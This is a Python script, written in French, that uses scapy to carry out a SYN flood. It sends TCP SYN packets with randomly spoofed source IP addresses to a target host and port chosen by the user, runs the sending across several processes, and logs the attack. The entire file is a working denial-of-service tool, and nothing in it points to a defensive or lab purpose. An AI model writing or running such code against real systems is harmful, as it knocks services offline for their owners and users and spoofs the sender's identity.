from barre_de_progression import barre
from scapy.all import *
import multiprocessing
from demande_user import DemandeUtilisateur
from journaltest import Journal
from ip_aleatoire import generer_ip_sources

class EnvoiPaquet:
   
    def envois(cible, port, nbrpaquet, results):
        messages = []
        for _ in range(nbrpaquet):
            ip_source = generer_ip_sources()
            message = f"Paquet envoyé - IP source: {ip_source}, Port: {port}, Destination: {cible}, Protocole: TCP"
            print(message)  # Affichage dans la console
            ip = IP(dst=cible, src=ip_source)
            tcpsyn = TCP(dport=port, flags="S")
            send(ip/tcpsyn, verbose=False)
            messages.append(message)  # Ajouter le message à la liste
        results.extend(messages)

class Journalisation:

    def journaliser(cible, port, nbrpaquet, nbr_processus, messages):
        journal = Journal()
        journal.log_demande(cible, port, nbrpaquet, nbr_processus)
        journal.log_recap_attaque(cible, port, nbrpaquet, nbr_processus, messages)

def syn(cible, port, nbrpaquet, nbr_processus):
    packets_per_process = nbrpaquet // nbr_processus
    results = multiprocessing.Manager().list()  # Liste partagée pour stocker les messages de tous les processus
    processes = []

    for _ in range(nbr_processus):
        p = multiprocessing.Process(target=EnvoiPaquet.envois, args=(cible, port, packets_per_process, results))
        processes.append(p)
        p.start()

    for p in processes:
        p.join()

    barre(nbrpaquet)

    
    Journalisation.journaliser(cible, port, nbrpaquet, nbr_processus, results)

if __name__ == "__main__":
    demande_utilisateur = DemandeUtilisateur()
    cible, port, nbrpaquet, nbr_processus = demande_utilisateur.obtenir_informations()
    syn(cible, port, nbrpaquet, nbr_processus)
